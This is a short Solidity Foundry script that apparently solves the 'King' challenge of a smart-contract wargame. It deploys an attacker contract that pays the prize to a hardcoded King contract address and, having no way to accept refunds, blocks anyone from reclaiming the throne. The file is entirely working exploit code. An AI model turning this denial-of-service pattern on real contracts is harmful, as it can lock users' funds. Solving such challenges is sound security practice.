// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "../src/King.sol";
import {Script} from "forge-std/Script.sol";

contract KingHacker {
    constructor(King _king) payable {
        address(_king).call{value: _king.prize()}("");
    }
}

contract KingSolution is Script {
    King public king = King(payable(0xAD00883bfa7163Be34d42108Eb13b2500Dc6d213));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new KingHacker{value: king.prize()}(king);
        vm.stopBroadcast();
    }
}
